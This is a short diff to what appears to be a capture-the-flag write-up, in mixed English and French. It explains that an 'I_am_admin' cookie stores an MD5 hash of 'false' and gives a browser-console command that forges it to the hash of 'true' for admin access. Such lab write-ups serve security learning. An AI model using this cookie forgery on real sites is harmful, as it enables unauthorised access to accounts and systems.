@@ -1,5 +1,7 @@
-commande a lancer dans la console:
+the cookie I_am_admin is at false in MD5 => http://www.md5online.fr/
+
+so juste crypte it back at true = b326b5062b2f0e69046810717534cb09
+
+and lunch this command in your console:
 
 document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09; expires=Thu, 18 Dec 2200 12:00:00 UTC; path=/";
-
-true = b326b5062b2f0e69046810717534cb09
